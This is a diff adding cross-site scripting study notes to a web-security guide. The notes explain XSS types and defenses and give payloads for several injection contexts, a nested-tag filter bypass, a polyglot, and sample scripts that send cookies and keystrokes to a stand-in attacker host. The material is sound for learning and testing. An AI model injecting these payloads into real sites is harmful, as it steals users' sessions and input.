@@ -894,3 +894,161 @@ Modern browsers support the `SameSite` attribute within the `Set-Cookie` HTTP he
 
 * **Custom Headers:** Modern web application architectures (like Single Page Apps) validate requests by enforcing custom API headers (e.g., `X-Requested-With: XMLHttpRequest`). Browsers restrict external cross-site forms from attaching custom headers without passing explicit Cross-Origin Resource Sharing (CORS) pre-flight pre-conditions.
 * **Re-Authentication Prompts:** For critical operations (e.g., updating account passwords or modifying financial routing), always force users to re-enter their existing credentials or complete a secondary verification factor.
+
+  ---
+
+   **Cross-Site Scripting (XSS)**
+
+---
+
+#  Cross-Site Scripting (XSS) Core Methodology
+
+## 1. The Architectural Core
+
+To exploit or defend against XSS, you must understand how the browser processes structures, holds session identities, and distinguishes data from executable instructions.
+
+### 🔹 Document Object Model (DOM)
+
+The DOM is the browser’s live, in-memory, structured blueprint of a web page represented as a tree of elements (tags, text attributes). When client-side JavaScript reads or modifies the DOM, the visible layout updates dynamically in real time.
+
+### 🔹 Browser Cookies & `HttpOnly`
+
+Cookies store lightweight local strings (session IDs, preferences). If a session identifier cookie lacks defenses, injected JavaScript can access it via `document.cookie`.
+
+* **The Shield:** The **`HttpOnly`** flag is a backend-set instruction telling the browser that the cookie must *never* be exposed to client-side scripts, completely neutralizing session-stealing via XSS.
+
+### 🔹 Escaping vs. Filtering
+
+* **Escaping (Output Encoding):** The definitive defense. It maps raw characters into safe literals before rendering (e.g., converting `<` to `&lt;` and `>` to `&gt;`). The browser prints `<script>` as harmless plain text rather than compiling an executable tag block.
+* **Filtering (Input Validation):** A perimeter sanity-check evaluating if an input matches strict rules (length, digits, character boundaries). It drops known bad strings but is prone to context-dependent bypasses.
+
+---
+
+## 2. Anatomy of an XSS Payload
+
+An XSS payload is an arbitrary JavaScript snippet injected into an untrusted parameter that tricks the browser into executing code under the site's unique security origin. Payloads consist of two operational dimensions:
+
+1. **Intention:** The payload's ultimate goal (e.g., creating a Proof-of-Concept pop-up, logging keystrokes, or exfiltrating data).
+2. **Modification (Context Escaping):** Altering the syntax structure so the payload breaks cleanly out of existing HTML tags, value attributes, or native script barriers.
+
+### Core Intentional Vectors
+
+* **Proof-of-Concept (PoC):** Verifies code execution.
+```html
+<script>alert('XSS')</script>
+
+```
+
+
+* **Session Exfiltration:** Base64-encodes (`btoa()`) session identities and beams them outward to an attacker's server.
+```html
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+```
+
+
+* **DOM Keylogger:** Hooks into keyboard event registers to capture input telemetry silently.
+```html
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>
+
+```
+
+
+
+---
+
+## 3. The Four Pillars of XSS Classification
+
+XSS flaws are sorted by how the data payload travels through the application lifecycle before executing in a victim's browser context.
+
+### 1️⃣ Reflected XSS
+
+* **The Flow:** The application takes user-supplied input from an immediate HTTP request parameter (like a URL query string `?q=`) and instantly echoes it back inside the HTTP response body without sanitization.
+* **Delivery:** Requires tricking a user into interacting with a crafted link or submitting a malicious form link (`https://site.com/search?q=<script>...`).
+
+### 2️⃣ Stored (Persistent) XSS
+
+* **The Flow:** The application accepts an input, writes it permanently into a persistent backend storage engine (database, message log, file system), and later pulls that raw string out to render it to other users or administrators.
+* **Delivery:** Highly critical; zero ongoing user interaction is required once planted. Affects anyone loading the compromised page (e.g., comments, profiles, product reviews).
+
+### 3️⃣ DOM-Based XSS
+
+* **The Flow:** The vulnerability executes entirely inside the client-side browser environment. Client-side JavaScript reads data from a controllable client DOM **Source** (like `location.search` or `location.hash`) and unsafe-writes it directly into a dangerous rendering **Sink** (like `innerHTML` or `document.write`).
+* **Delivery:** The payload never needs to touch or process through the server's backend infrastructure.
+
+### 4️⃣ Blind XSS
+
+* **The Flow:** A subterranean variant of Stored XSS. The attacker injects a payload into an input field (like a feedback form or support ticket descriptor), but lacks access to view the output page. Instead, the payload is rendered later inside a completely private application boundary (like an internal admin dashboard or log management portal).
+* **Delivery:** Requires an out-of-band network callback (like an external HTTP `fetch` or DNS beacon) to notify the tester when and where the payload triggers.
+
+---
+
+## 4. Context Escaping & Filter Bypass Manual
+
+When an application drops input inside tags rather than an open HTML body, you must adapt your input structure to re-establish an executable scripting context.
+
+### Context 1: Standard Input Value Attributes
+
+* **The Scenario:** Your input is placed inside the value assignment of an input field: `<input type="text" name="username" value="YOUR_INPUT">`
+* **The Escape:** Close out the parameter quote and close the entire parent HTML tag structure first:
+```html
+"><script>alert('THM');</script>
+
+```
+
+
+
+### Context 2: Textarea Boundaries
+
+* **The Scenario:** Input falls within raw text container tags: `<textarea>YOUR_INPUT</textarea>`
+* **The Escape:** You must explicitly close the open container tag to force the browser back into an HTML parsing mode before opening a new script tag:
+```html
+</textarea><script>alert('THM');</script>
+
+```
+
+
+
+### Context 3: Direct JavaScript Reflection
+
+* **The Scenario:** Input is dropped straight into an existing variable string inside a script element block: `let currentProfile = 'YOUR_INPUT';`
+* **The Escape:** Balance out the open string quote, terminate the active variable statement using a semicolon, write your standalone payload, and convert all trailing leftovers into inline comments (`//`):
+```javascript
+';alert('THM');//
+
+```
+
+
+
+### Context 4: Recursive Stripping Filters
+
+* **The Scenario:** The server employs a naive, single-pass blocklist filter that looks for `<script>` strings and deletes them entirely.
+* **The Escape:** Nest the blacklisted term recursively inside itself. When the engine slices out the inner core, the surrounding outer fragments collapse together to form a fully operational tag:
+```html
+<sscriptcript>alert('THM');</sscriptcript>
+
+```
+
+
+
+### Context 5: Angle Bracket Elimination (`<` and `>` Blocked)
+
+* **The Scenario:** The server explicitly drops or escapes `<` and `>`, preventing the generation of new HTML tags, but leaves quotes intact.
+* **The Escape:** Leverage additional event attributes native to elements like images, inputs, or body tags to prompt code execution via inline event triggers (e.g., `onload`, `onerror`, `onmouseover`):
+```html
+/images/cat.jpg" onload="alert('THM');
+
+```
+
+
+
+---
+
+## 📋 XSS Universal Polyglot Reference
+
+An **XSS Polyglot** is a single, highly dense string engineered to break out of multiple attribute scopes, scripts, styles, textareas, and tag boundaries simultaneously while routing around common keywords and character filters. Pentesters throw these at complex endpoints to test multiple execution contexts at once:
+
+```javascript
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+```
